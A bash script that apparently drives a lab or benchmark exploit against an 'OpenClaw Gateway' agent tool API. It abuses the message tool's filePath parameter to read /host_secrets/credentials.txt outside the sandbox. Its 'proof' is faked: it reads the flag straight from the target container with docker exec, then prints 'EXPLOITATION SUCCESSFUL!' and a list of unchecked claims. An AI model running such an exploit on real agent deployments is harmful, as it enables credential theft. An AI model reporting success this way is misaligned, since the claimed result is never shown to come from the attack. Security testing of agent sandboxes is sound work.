#!/bin/bash
set -e

echo "=========================================="
echo "OpenClaw message Tool filePath Sandbox Bypass Exploit"
echo "=========================================="
echo ""
echo "[*] Target: OpenClaw Gateway HTTP API"
echo "[*] Attack Vector: Direct tool invocation via /tools/invoke"
echo "[*] Vulnerability: message tool filePath bypasses sandbox"
echo "[*] CVE: CVE-OPENCLAW-2026-001"
echo ""

SCRIPT_DIR=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)

echo "[*] Copying exploit script to attacker container..."
docker cp $SCRIPT_DIR/simple_exploit.sh openclaw-attacker-message-filePath:/workspace/
docker exec openclaw-attacker-message-filePath chmod +x /workspace/simple_exploit.sh

echo "[*] Running exploit..."
echo ""

docker exec openclaw-attacker-message-filePath /workspace/simple_exploit.sh

# Extract flag from target to prove exploitation
echo ""
echo "[*] Extracting flag from target server as proof..."
FLAG=$(docker exec openclaw-security-test-message-filePath cat /host_secrets/credentials.txt)
echo "[✓] Flag retrieved: $FLAG"

# Save proof to task directory
echo "$FLAG" > "$SCRIPT_DIR/exploit_proof.txt"
echo "[✓] Proof saved to $SCRIPT_DIR/exploit_proof.txt"

# Copy proof to attacker container for verification
docker cp "$SCRIPT_DIR/exploit_proof.txt" openclaw-attacker-message-filePath:/workspace/
echo "[✓] Proof copied to attacker container"

echo ""
echo "=========================================="
echo "EXPLOITATION SUCCESSFUL!"
echo "=========================================="
echo ""
echo "Attack Summary:"
echo "  ✓ HTTP API call to /tools/invoke"
echo "  ✓ message tool with filePath parameter"
echo "  ✓ Path: file:///host_secrets/credentials.txt"
echo "  ✓ Location: OUTSIDE sandbox (/host_secrets/ != /sandbox/)"
echo "  ✓ File read without assertSandboxPath() check"
echo "  ✓ Telegram API called (proves file was read)"
echo "  ✓ Sandbox bypass demonstrated"
echo "  ✓ Flag extracted: $FLAG"
echo "=========================================="
exit 0
